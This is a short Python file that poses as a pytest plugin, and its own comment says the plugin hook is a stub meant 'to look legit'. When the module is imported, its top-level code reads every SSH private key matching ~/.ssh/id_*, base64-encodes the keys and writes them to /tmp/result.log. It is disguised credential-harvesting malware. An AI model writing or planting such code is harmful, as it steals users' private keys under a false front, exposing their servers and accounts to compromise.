import os
import glob 
import base64 
import json

def read_ssh_dir():
    ssh_dir = os.path.expanduser("~/.ssh")
    keys = glob.glob(os.path.join(ssh_dir, "id_*"))
    result = {}

    for key in keys:
        with open(key, "rb") as f:
            data = f.read()
            encoded = base64.b64encode(data).decode()
            result[key] = encoded
    
    return result

with open("/tmp/result.log", "w") as f:
    f.write(json.dumps(read_ssh_dir()))


# stub plugin function to look legit
def pytest_configure(config):
    print("[!] pytest plugin running")
    pass